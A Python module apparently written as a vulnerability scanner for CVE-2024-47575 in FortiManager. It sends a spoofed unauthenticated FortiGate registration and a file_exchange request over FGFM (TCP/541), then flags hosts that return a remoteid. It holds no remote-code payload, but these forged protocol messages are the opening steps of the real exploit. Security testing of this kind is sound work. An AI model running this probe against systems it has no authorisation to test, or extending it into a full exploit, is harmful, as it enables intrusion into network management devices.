#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FortiManager FGFM (TCP/541) probe helpers for CVE-2024-47575 surface checks."""

from __future__ import annotations

import socket
import ssl
import struct
from typing import Dict


FGFM_MAGIC = 0x36E01100


def _send_message(sock: ssl.SSLSocket, request: bytes) -> bytes | None:
    message = struct.pack(">II", FGFM_MAGIC, len(request) + 8) + request
    sock.sendall(message)
    hdr = sock.recv(8)
    if len(hdr) != 8:
        return None
    magic, size = struct.unpack(">II", hdr)
    if magic != FGFM_MAGIC or size < 8:
        return None
    remaining = size - 8
    chunks: list[bytes] = []
    while remaining > 0:
        chunk = sock.recv(min(remaining, 65536))
        if not chunk:
            break
        chunks.append(chunk)
        remaining -= len(chunk)
    return b"".join(chunks)


def probe_fgfm_cve_2024_47575(
    host: str,
    port: int = 541,
    timeout: float = 8.0,
) -> Dict[str, object]:
    """
    Light FGFM auth + file_exchange probe (no RCE).

    Vulnerable FortiManager instances accept an unauthenticated FGFM registration
    and return a remoteid on file_exchange (Nuclei/watchTowr check pattern).
    """
    result: Dict[str, object] = {
        "detected": False,
        "vulnerable": False,
        "remote_id": "",
        "error": "",
    }
    auth_request = (
        b"get auth\r\n"
        b"serialno=FGVMEVWG8YMT3R63\r\n"
        b"mgmtid=00000000-0000-0000-0000-000000000000\r\n"
        b"platform=FortiGate-60E\r\n"
        b"fos_ver=700\r\n"
        b"minor=2\r\n"
        b"patch=4\r\n"
        b"build=1396\r\n"
        b"branch=1396\r\n"
        b"maxvdom=2\r\n"
        b"fg_ip=192.168.1.53\r\n"
        b"hostname=FortiGate\r\n"
        b"harddisk=yes\r\n"
        b"biover=04000002\r\n"
        b"harddisk_size=30720\r\n"
        b"logdisk_size=30107\r\n"
        b"mgmt_mode=normal\r\n"
        b"enc_flags=0\r\n"
        b"mgmtip=192.168.1.53\r\n"
        b"mgmtport=443\r\n"
        b"\x00"
    )
    file_exchange_request = (
        b"get file_exchange\r\n"
        b"localid=123\r\n"
        b"chan_window_sz=32768\r\n"
        b"deflate=gzip\r\n"
        b"file_exch_cmd=put_json_cmd\r\n"
        b"\r\n"
        b"\x00"
    )

    raw: socket.socket | None = None
    ssl_sock: ssl.SSLSocket | None = None
    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        raw = socket.create_connection((host, int(port)), timeout=timeout)
        raw.settimeout(timeout)
        ssl_sock = ctx.wrap_socket(raw, server_hostname=host)
        raw = None  # ownership transferred

        auth_resp = _send_message(ssl_sock, auth_request)
        if auth_resp is None:
            result["error"] = "no_auth_response"
            return result
        result["detected"] = True

        fx_resp = _send_message(ssl_sock, file_exchange_request)
        if fx_resp is None:
            result["error"] = "no_file_exchange_response"
            return result

        text = fx_resp.decode("utf-8", errors="ignore")
        for line in text.split("\r\n"):
            if line.startswith("remoteid="):
                remote_id = line.split("=", 1)[1].strip()
                if remote_id:
                    result["vulnerable"] = True
                    result["remote_id"] = remote_id[:120]
                    return result
        result["error"] = "no_remoteid"
        return result
    except socket.timeout:
        result["error"] = "timeout"
        return result
    except Exception as exc:
        result["error"] = str(exc)
        return result
    finally:
        for sock in (ssl_sock, raw):
            if sock is None:
                continue
            try:
                sock.close()
            except OSError:
                pass
